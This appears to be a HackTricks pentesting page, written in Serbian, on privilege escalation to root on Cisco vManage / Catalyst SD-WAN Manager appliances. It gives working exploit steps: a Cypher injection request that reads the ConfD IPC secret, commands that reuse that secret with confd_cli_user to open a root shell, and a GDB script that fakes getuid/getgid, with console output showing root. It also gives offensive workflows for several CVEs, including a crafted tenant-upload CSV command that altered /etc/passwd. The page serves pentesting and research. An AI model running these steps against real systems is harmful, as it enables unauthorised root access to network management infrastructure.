# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Kada dobijete izvršavanje koda na Cisco vManage / *Catalyst SD-WAN Manager* kao korisnik `vmanage`, `netadmin` ili `vmanage-admin`, najzanimljivije lokalne privesc površine obično su `confd` CLI stack, pomoćni program `cmdptywrapper`, REST API-ji na localhost-u i handler-i za import/upload u vlasništvu root-a.

Ako vam je i dalje potreban **početni pristup** kontroleru, prvo proverite posebnu stranicu o control-plane-u:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Brza lokalna trijaža
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Ako je `/etc/confd/confd_ipc_secret` čitljiv iz vašeg početnog pristupa, Putanja 1 i Putanja 2 odmah postaju praktične. Ako ste pristup dobili putem udaljenog otkrivanja datoteka ili webshell-a, takođe proverite `vmanage-admin` SSH materijal i rukovaoce za otpremanje u multitenancy okruženju; nedavna istraživanja pokazala su da su oba izvodljiva pivota.<sup>[[3]](#references)[[4]](#references)</sup>

## Putanja 1

Synacktiv-ova procena vManage-a dokumentuje ovu putanju do root shell-a.<sup>[[5]](#references)</sup>

[ConfD dokumentacija](http://66.218.245.39/doc/html/rn03re18.html) na koju se izveštaj poziva opisuje IPC autentikaciju; njen vManage primer postavlja tajnu na `/etc/confd/confd_ipc_secret` i pokazuje da je čitljiva za `vmanage`.<sup>[[5]](#references)</sup>
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Pošto Neo4j radi sa privilegijama `vmanage` u prijavljenom setup-u, prethodna Cypher injection može da pročita tajni fajl.<sup>[[5]](#references)</sup>
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` sam ne prihvata argumente komandne linije; poziva `/usr/bin/confd_cli_user`. Prijavljeni tok rada izdvaja taj pomoćni program čitljiv za root iz rootfs-a, kopira ga putem `scp`, čita njegovu pomoć, postavlja `CONFD_IPC_ACCESS_FILE` i poziva ga sa `-U 0 -G 0` kako bi dobio root shell.<sup>[[5]](#references)</sup>
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Putanja 2

Ova alternativna putanja je prilagođena istraživanju kompanije Walmart Global Tech o vManage 19.2.2.<sup>[[6]](#references)</sup>

Synacktiv putanja zahteva kopiju datoteke `/usr/bin/confd_cli_user`, kojoj root u prijavljenom okruženju može da pristupi; Walmart izveštaj umesto toga menja vrednosti identiteta datoteke `confd_cli` unutar GDB-a.<sup>[[5]](#references)[[6]](#references)</sup>

Disassembly izveštaja pokazuje da `confd_cli` prikuplja UID i GID pozivaoca.<sup>[[6]](#references)</sup>

<details>
<summary>Objdump koji prikazuje prikupljanje UID/GID-a</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Isti test je pokazao da `cmdptywrapper`, u vlasništvu korisnika root, prima eksplicitne vrednosti `-g` i `-u`.<sup>[[6]](#references)</sup>
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Istraživač je zaključio da `confd_cli` prosleđuje UID i GID prijavljenog korisnika aplikaciji `cmdptywrapper`.<sup>[[6]](#references)</sup>

Direktno pokretanje aplikacije `cmdptywrapper` sa opcijama `-g 0 -u 0` nije uspelo jer zahtevani file descriptor (`-i 1015` u primeru) nije bio dostupan.<sup>[[6]](#references)</sup>

Pošto `confd_cli` ne izlaže te vrednosti kao argumente, u izveštaju je korišćen GDB za prepravku povratnih vrednosti funkcija `getuid()` i `getgid()`; GDB je bio prisutan na tom appliance-u.<sup>[[5]](#references)[[6]](#references)</sup>

Uz `vmanage` pristup, test je mogao da pročita `/etc/confd/confd_ipc_secret`; sledeća skripta primorava oba poziva za identitet da vrate nulu.<sup>[[6]](#references)</sup>

GDB skripta korišćena u izveštaju je:<sup>[[6]](#references)</sup>
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Prijavljeni izlaz konzole je:<sup>[[6]](#references)</sup>

<details>
<summary>Izlaz konzole</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Putanja 3 (greška validacije CLI inputa iz 2025. - CVE-2025-20122)

Cisco je kasnije dokumentovao čistiju lokalnu root putanju u sopstvenom advisory-ju za [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt). **Autentifikovani attacker sa samo read-only privilegijama** mogao je da pošalje posebno napravljen zahtev manager CLI-ju i dobije root zbog nedovoljne validacije inputa.<sup>[[7]](#references)</sup>

Iz ofanzivne perspektive, ovaj advisory i ranije CLI istraživanje ukazuju na sledeći workflow.<sup>[[6]](#references)[[7]](#references)</sup>

1. Kada ostvarite *bilo kakav low-priv foothold na box-u*, testirajte lokalni CLI service pre nego što pređete na zahtevniji workflow za Path 1 / Path 2.
2. Ponovo upotrebite artefakte iz Path 2 da pronađete trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Tretirajte svako polje prosleđeno CLI backend-u kao sumnjivo: UID/GID, username, terminal metadata, importovani fajlovi ili bilo koja vrednost koju kasnije koristi root-owned helper.
4. Ako low-priv user može da pristupi lokalnom CLI socket-u i utiče na ta polja, root može biti udaljen samo jedan posebno napravljen zahtev.

Nakon pristupa appliance-u, pregledajte lokalni CLI chain na sledeći način.<sup>[[6]](#references)[[7]](#references)</sup>
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Ovo pretvara bug iz 2025. godine u ponovljiv hunting pattern: tražite **lokalne CLI shim-ove koji prikupljaju identitet u userland-u i prosleđuju ga privilegovanom wrapper-u**.<sup>[[6]](#references)[[7]](#references)</sup>

Ne mešajte **CVE-2025-20122** sa kasnijim **CVE-2026-20122**: problem iz 2025. je *lokalni* CLI-to-root bug, dok je problem iz 2026. *remote* API arbitrary file overwrite koji je uglavnom koristan za postavljanje foothold-a, a zatim za ponovni pregled Path 1 / Path 2 / Path 4.<sup>[[3]](#references)[[7]](#references)</sup>

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco-ov savet iz februara 2026. opisuje još jednu korisnu klasu privesc-a, [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v). **Autentifikovani lokalni napadač sa niskim privilegijama** mogao je da dobije root zbog nedovoljnog mehanizma za autentifikaciju korisnika u REST API-ju.<sup>[[1]](#references)</sup>

Ovo je važno zato što vManage privesc više nije ograničen na zloupotrebu `confd`/TTY-ja; nakon dobijanja low-priv shell-a, takođe tražite sledeće.<sup>[[1]](#references)</sup>

- API endpoint-e dostupne samo na localhost-u koji previše veruju pozivaocu
- tokene, cookies ili servisne credentials-e čitljive sa trenutnog naloga
- akcije dostupne samo root-u, izložene kroz `dataservice`/REST handlers-e koje je i dalje moguće lokalno pokrenuti

U praksi, kada imate shell kao `vmanage` ili drugog servisnog korisnika, lokalnu zloupotrebu API-ja može biti lakše automatizovati nego interaktivnu zloupotrebu CLI-ja.<sup>[[1]](#references)</sup>
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Ako je lokalni kontekst sesije dovoljan za pristup privilegovanoj REST funkcionalnosti, prednost dajte API putanji: lakše ju je ponoviti, automatizovati skriptama i povezati sa ukradenim web sesijama ili API tokenima.<sup>[[1]](#references)</sup>

## Putanja 5 (posebno izrađena datoteka koju obrađuje root - CVE-2026-20245)

Drugi noviji obrazac je [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx). Lokalni napadač sa `netadmin` privilegijama mogao je da otpremi **posebno izrađenu datoteku** koju je CLI kasnije nebezbedno obrađivao, što je dovodilo do command injection-a kao `root`.<sup>[[2]](#references)</sup>

Sa stanovišta HackTricks-a, vredna tehnika je šira od konkretnog CVE-a.<sup>[[2]](#references)</sup>

1. Nabrojte svaki CLI ili web workflow koji prihvata datoteke: uvoze, dijagnostičke pakete, templejte, validatore, rezervne kopije, podatke tenant-a itd.
2. Utvrdite gde otpremljena datoteka završava i koja skripta ili binarni fajl u vlasništvu korisnika `root` je koristi.
3. Testirajte da li se naziv datoteke, sadržaj datoteke ili parsirani metapodaci ikada prosleđuju shell komandama, wrapper skriptama ili pomoćnim funkcijama u stilu `system()`.
4. Ako već možete da dođete do `netadmin` naloga (važeće akreditive, ukradena sesija ili lanac zaobilaženja autentikacije), greške u obradi datoteka često su najbrži put do `root`-a.

Google Cloud / Mandiant su kasnije pokazali konkretan slučaj iskorišćavanja ove klase grešaka kroz multitenancy import path.<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
U posmatranom napadu, posebno kreirani CSV izmenio je `/etc/passwd` i `/etc/shadow` kako bi kreirao privremeni nalog sa UID 0 (`troot`). Zbog toga su importer-i u stilu `tenant-upload` / `tenant-list` naročito zanimljivi: oni nisu samo funkcije za unos podataka, već potencijalni parser front-end-i u vlasništvu root-a.<sup>[[4]](#references)</sup>

Brz obrazac za pretragu sa shell strane je:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Ova klasa grešaka posebno se dobro ulančava sa udaljenim foothold-ovima koji dodeljuju `netadmin`, ali ne i `root`.<sup>[[2]](#references)[[4]](#references)</sup>

## Druge novije vManage/Catalyst SD-WAN Manager ranjivosti koje se mogu ulančati

- **Unauthenticated info leak (CVE-2026-20133)** – Posebno je vredna jer je javno istraživanje pokazalo da može otkriti `confd_ipc_secret` ili privatni ključ `vmanage-admin`, pretvarajući read bug u Path 1 ili NETCONF pivot.<sup>[[3]](#references)</sup>
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – Razlikuje se od CLI greške iz 2025. navedene iznad; VulnCheck ju je iskoristio za upload webshell-a, čime lokalni privesc putevi na ovoj stranici postaju odmah relevantni.<sup>[[3]](#references)</sup>
- **Authenticated UI XSS (CVE-2024-20475)** – Authenticated napadač može izvršiti script u web interfejsu pogođenog korisnika; procenite da li rezultujući session context otkriva API/CLI akcije koje vode do `vshell` ili do nekog od prethodno navedenih lokalnih privesc puteva.<sup>[[9]](#references)</sup>
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Veoma snažan precursor za Path 5 jer je `netadmin` upravo nivo potreban za privesc pomoću crafted file-a iz 2026.<sup>[[2]](#references)[[3]](#references)</sup>
- **Authenticated arbitrary file write (CVE-2026-20262)** – Ima sličnu offensive vrednost kao CVE-2026-20122, ali kroz kasniji web UI upload path; Cisco navodi da bi file kreiran ili prepisan ovom greškom kasnije mogao biti iskorišćen za elevaciju na root.<sup>[[10]](#references)</sup>
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – Intrusions iz 2026. pokazale su da napadači mogu vratiti sistem na stariji ranjivi SD-WAN build, iskoristiti staru CLI root grešku, a zatim vratiti originalnu verziju.<sup>[[8]](#references)</sup>
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Detaljnije je dokumentovan na posebnoj SD-WAN control-plane stranici; može dodati SSH ključ za `vmanage-admin`, čime se obezbeđuje persistent NETCONF access za naknadne management-plane akcije.<sup>[[11]](#references)</sup>



## References

- [1] [Cisco Catalyst SD-WAN ranjivosti (CVE-2026-20126, CVE-2026-20129, itd.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Authenticated Privilege Escalation ranjivost u Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager i Catalyst SD-WAN Validator (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck: Herding Cats - novije ranjivosti Cisco SD-WAN Manager-a](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant: Zero-Day exploitation ranjivosti (CVE-2026-20245) u Cisco Catalyst SD-WAN Manager-u](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Pentesting Cisco SD-WAN, 1. deo: napad na vManage](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking Cisco SD-WAN vManage 19.2.2 — od CSRF-a do Remote Code Execution-a](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Privilege Escalation ranjivost u Cisco Catalyst SD-WAN Manager-u (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [Aktivna eksploatacija Cisco Catalyst SD-WAN-a od strane UAT-8616 (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)
- [9] [Cross-Site Scripting ranjivost u Cisco Catalyst SD-WAN Manager-u (CVE-2024-20475)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-xss-zQ4KPvYd)
- [10] [Arbitrary File Write ranjivost u Cisco Catalyst SD-WAN Manager-u (CVE-2026-20262)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-arbfw-c2rZvQ)
- [11] [Rapid7: CVE-2026-20182 - kritični authentication bypass u Cisco Catalyst SD-WAN Controller-u](https://www.rapid7.com/blog/post/ve-cve-2026-20182-critical-authentication-bypass-cisco-catalyst-sd-wan-controller-fixed/)
{{#include ../../banners/hacktricks-training.md}}
